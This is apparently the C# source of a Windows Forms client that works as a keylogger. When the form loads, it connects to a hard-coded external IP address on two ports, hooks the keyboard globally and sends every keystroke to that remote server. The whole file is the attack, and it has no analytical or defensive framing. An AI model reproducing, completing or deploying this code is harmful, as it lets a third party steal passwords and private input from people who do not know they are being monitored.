using Keystroke.API;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    public partial class Form1 : Form
    {

        private TcpClient client;
        private TcpClient keylogClient;
        private NetworkStream mainstream;
        private NetworkStream keylogStream;
        // private byte[] receiveBuffer;
        private IPEndPoint IPServer;
        private IPEndPoint IPKeyServer;
        private Thread BeginKeylg;
        private Thread ClientConnect;
        public Form1()
        {
            InitializeComponent();
        }

        void ClientConnectFunc()
        {
            try
            {
                client = new TcpClient();
                IPServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 10001);
                client.Connect(IPServer);

                BeginKeylg = new Thread(KeyLogConnect);
                BeginKeylg.Start();
                BeginKeylg.IsBackground = true;



                /*mainstream = client.GetStream();
                byte[] msg = UTF8Encoding.Unicode.GetBytes("Connected");
                mainstream.Write(msg, 0, msg.Length);*/

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        void KeyLogConnect()
        {
            try
            {
                keylogClient = new TcpClient();
                IPKeyServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 16785);
                keylogClient.Connect(IPKeyServer);
                keylogStream = keylogClient.GetStream();
                KeyLog();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        void SendKeylloger(string s)
        {
            byte[] msg = UTF8Encoding.UTF8.GetBytes(s);
            keylogStream.Write(msg, 0, msg.Length);
            

        }

        void KeyLog()
        {
            try
            {
                
                while (keylogClient.Connected)
                {
                    using (var api = new KeystrokeAPI())
                    {
                        api.CreateKeyboardHook((character) => { SendKeylloger(character.ToString()); });
                        Application.Run();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ClientConnect = new Thread(ClientConnectFunc);
            ClientConnect.Start();
            ClientConnect.IsBackground = true;

            

        }
    }
}